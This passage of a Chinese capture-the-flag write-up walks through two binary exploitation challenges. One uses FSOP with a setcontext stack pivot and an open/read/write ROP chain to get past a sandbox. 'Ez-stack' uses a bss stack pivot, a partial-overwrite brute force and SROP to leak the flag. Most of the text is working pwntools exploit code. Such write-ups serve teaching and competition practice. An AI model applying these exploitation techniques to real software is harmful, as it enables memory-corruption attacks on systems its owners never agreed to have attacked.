
```python
from pwn import *
io = process('./pwn')
libc = ELF('./libc.so.6')
# io = remote("123.56.27.220",26633)
def bug():
    gdb.attach(io)
def add(size):
    io.sendlineafter(b"Choice: ", b"1")
    io.sendlineafter(b"Size: ", str(size).encode())
    io.send(b'a'*0x28)
    io.recvuntil(b'a'*0x28)
    base = u64(io.recv(6) + b'\x00\x00') - 0xaddae
    print(hex(base))
    stdin = base + 0x2038e0
    add(stdin + 0x38 + 1)
    IO = base + libc.sym._IO_2_1_stdout_
    io.send(p64(0)*3 + p64(IO) + p64(IO + 0xa000))
```

由于开启了沙箱,使用 `orw` 绕过沙箱即可

直接在 `IO` 结构体中 `FSOP`,使用 `setcontext` 进行栈迁移即可执行 `ROP`

```python
from pwn import *
io = process('./pwn')
libc = ELF('./libc.so.6')
# io = remote("123.56.27.220",26633)
def bug():
    gdb.attach(io)
def add(size):
    io.sendlineafter(b"Choice: ", b"1")
    io.sendlineafter(b"Size: ", str(size).encode())
    io.send(b'a'*0x28)
    io.recvuntil(b'a'*0x28)
    base = u64(io.recv(6) + b'\x00\x00') - 0xaddae
    print(hex(base))
stdin = base + 0x2038e0
add(stdin + 0x38 + 1)
IO = base + libc.sym._IO_2_1_stdout_
io.send(p64(0)*3 + p64(IO) + p64(IO + 0xa000))
rdi = base + 0x000000000010f78b
rsi = base + 0x0000000000110a7d
rdx = base + 0x0000000000138d05  # movsxd rdx, ecx ; ret
rcx = base + 0x00000000000a877e
jmp_gadget = base + 0x00000000000ee303
openat = base + libc.sym.openat
read = base + libc.sym.read
write = base + libc.sym.write
# ------------------------------------------------
rop = p64(rdi) + p64(0x10000000000000000 - 100)
rop += p64(rsi) + p64(IO + 0xe8)
rop += p64(rcx) + p64(0) + p64(rdx)
rop += p64(rcx) + p64(0)
rop += p64(openat)
rop += p64(rdi) + p64(3)
rop += p64(rsi) + p64(IO + 0xe0)
rop += p64(rcx) + p64(0x50) + p64(rdx)
rop += p64(read)
rop += p64(rdi) + p64(1)
rop += p64(rsi) + p64(IO + 0xe0)
rop += p64(rcx) + p64(0x50) + p64(rdx)
rop += p64(write)
# --------------------------------------------------
fake_file = flat({
    0x0:  p64(0x320),
    0x10: p64(base + libc.sym.setcontext + 61),
    0x20: p64(IO),
    0x78: p64(jmp_gadget),
    0x88: p64(base + libc.sym._environ - 0x10),  # _lock_chain
    0xa0: p64(IO),
    0xa8: p64(jmp_gadget),
    0xd8: p64(base + libc.sym._IO_wfile_jumps + 0x10),
    0xe0: p64(IO - 8)
}, filler=b"\x00")
fake_file += b"./flag".ljust(0x10, b'\x00')
fake_file += rop
io.sendafter("Choice:", fake_file)
io.interactive()
```

## Ez-stack

### 前置分析

![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_FC6YBZZC879FRC5.webp)

程序的逻辑十分简单,可以溢出0xd8字节,存在沙箱且有一个小后门(将读入的字节数写入栈上)

![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_65A8AYA6DE8D883.webp)

可以看到沙箱留下了 `wr` 和 `Sigreturn` 以及一些无关紧要的系统调用

![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_ZWY4DSDQ2QEC4KP.webp)

通过 `dockerfile` 可以分析出 `flag` 作为环境变量,被放在栈上

省去了 `orw` 中 `open` 和 `read` 两步,我们只需要获得栈地址再遍历栈就可以获得 `flag`

### 攻击面分析

第一步,由于我们没有栈地址,所以应该先进行栈迁移到 `bss` 上

想要使用 `SROP` 又需要 `syscall` 地址,而 `syscall` 只能来自于 `libc`

所以应该在 `bss` 上写入 `libc` 地址

那么可以在栈迁移后调用 `start` 函数,将大量地址写入 `bss` 段

```python
from pwn import *
env = {'FLAG': 'flag{your_flag_here}'}
io = process('./pwn', env=env)
libc = ELF('./libc.so.6')
# io = remote("47.105.116.238",9999)
def bug():
    gdb.attach(io, "b *0x4015FB")
context.arch = 'amd64'
read = 0x4015FB
bss = 0x404000 + 0x800  # 从 bss 的中间部分开始栈迁移
start = 0x401170
leave = 0x40161E
target = 0x4047c0
ret = leave + 1
syscall = 0x404788  # src:0x2a2dc   target:0x91316   在 libc 中的 syscall;ret 地址
magic = 0x40123D - 1  # 用于对任意 libc 地址进行偏移调整的 gadget
rbp = magic + 1
payload = p64(bss)*3 + 2*p64(bss) + p64(read)
io.send(payload)
pause()
payload = p64(bss - 0x20) + p64(start) + b'\x00'*8 + p64(bss - 0x400) + p64(bss - 0x20) + p64(leave)
io.send(payload)
```

![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_V4XQ5MSTVNUMQYH.webp)

可以看到已经有不少 `libc` 地址被写入 `bss` 段

下一步想使用 `magic_gadget` 将任意 `libc` 地址修改为 `syscall` 地址,但是使用 `magic_gadget` 的前提是控制 `rbx` 与 `rbp` 寄存器,想控制这两个寄存器则需要 `pop rbx;ret` 这样的指令

我们有需要从 `libc` 中获得,通过观察可以发现

![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_W7NEYGDZBQTHKUM.webp)

![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_FUHX88B89H9Z39V.webp)

在 `bss` 段的 `libc` 地址的附近有这样的 `gadget`,但是与 `libc` 地址相差了2字节,由于 `libc` 偏移的页偏移机制,只有1.5字节是固定的,所以这里需要爆破半字节(1/16)

通过末位覆盖达成这个目的(`p16(0xa2dc)`)

```python
payload = p64(bss)*3 + 2*p64(target + 0x20 - 0x30) + p64(read) + b'a'*0x98 + p16(0xa2dc)
io.send(payload)
pause()
```

注意这里的 `gadget` 使用的是从 `add rsp,0x38` 开始的,至于为什么要这样选择要看后续利用

此时这个 `libc` 地址变成了可以控制 `rbx`/`rbp` 的 `gadget`,我们还需要在这个 `gadget` 的高地址处布置 `magic_gadget` 与其他 `ROP`,所以要把 `target` 设置为这个 `libc` 地址的下一个 `bss` 地址

![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_AJ9ZWCMGT4F2JZ5.webp)

从此处开始布置新的 `ROP` 链,此次布置要包含两个部分

1. 直接覆盖返回地址,控制下次溢出时执行流到 `change_libc_ROP` 的低地址处
2. 续写 `change_libc_ROP`,将 `magic_gadget` 与后续调用写入高地址

这也是刚刚选择控制 `rbx` 的 `gadget` 时要带上一段跳栈汇编 `add rsp,0x38` 的原因,需要保证两个 `ROP` 不能重叠

```python
payload = p64(0x404790 + 0x20) + p64(read)  # 这次的返回地址
payload += b'0'*8 + p64(bss - 0x300) + p64(target - 0x60) + p64(read) + b'1'*8  # 此次执行用于向低地址写的 ROP
payload += p64(-0x2a2dc + 0x91316)  # 当前 libc 地址到 syscall 地址的偏移
payload += p64(syscall + 0x3d) + p64(magic)  # 当前 libc 地址对应的 bss 地址+0x3d 与 magic_gadget
target = 0x404790
payload += p64(rbp) + p64(target) + p64(leave)  # 第二次溢出后执行栈迁移,将 RSP 拉低到低地址(如果只靠 pop rbp 与部分 read,RSP 只会越来越高,必须使用 leave 才能拉低 RSP)
io.send(payload)
```

此后向低地址垫入 `ret` 滑梯,便可以将 `RSP` 滑到布置了好久的 `ROP` 上,执行将 `libc` 地址修改为 `syscall` 地址的 `ROP`

![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_AXU5GQU9X8A2V2C.webp)

```python
payload = b'a'*0x18 + p64(bss - 0x600) + p64(bss) + p64(ret)*4
io.send(payload)
```

经过这个 `ROP`,`bss` 上的 `Libc` 地址被成功改写为 `syscall` 地址,离我们使用 `SROP` 进了一步

我们在写 `SROP` 前要先梳理下目标结构

![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_Q8YCZTNBEARJQVP.webp)

高地址处要写入 `SigreturnFrame`,低地址要写入 `ret` 滑梯,并且要在滑梯中插入一个 `read.plt`(控制 `rax` 用)

```python
f = SigreturnFrame()
f.rsp = syscall
f.rax = 1
f.rdi = 1
f.rsi = 0x403FC0
f.rdx = 0x8
f.rip = ret
f.rbp = 0x404790 + 0x20
payload = p64(read) + p64(rbp) + p64(target - 0x60) + p64(read) + p64(leave) + bytes(f)[0x28:]
io.send(payload)
pause()
```

上次布置的 `ROP` 允许我们直接向 `syscall` 的高地址写入内中

我们除了要写 `SigreturnFrame`,还要写入 `syscall` 后的后续利用:我们通过 `SROP` 获取 `libc` 地址后对栈遍历的 `ROP`

我们先写入

```python
io.send(p64(target - 0x40)*5 + p64(read) + p64(bss)*2)
pause()
```

然后通过刚刚的 `leave` 将 `RSP` 移到 `syscall` 的低地址,再调用 `read`,便可以向低地址到 `syscall` 中间填充 `ret` 滑梯

```python
io.send(p64(ret)*5 + p64(0x401110) + p64(ret)*5)
pause()
io.send(b'a'*0xf)
pause()
```

最后一次栈溢出,便将 `RSP` 沿着 `ret` 滑梯,滑倒了 `syscall` 上

![图片描述](https://bbs.kanxue.com/upload/attach/202510/1024538_BDT96BNHFXTFG3J.webp)

上半部分是 `ret` 滑梯,下半部分是后续的 `SigreturnFrame` 与后续 `ROP` 的重合结构
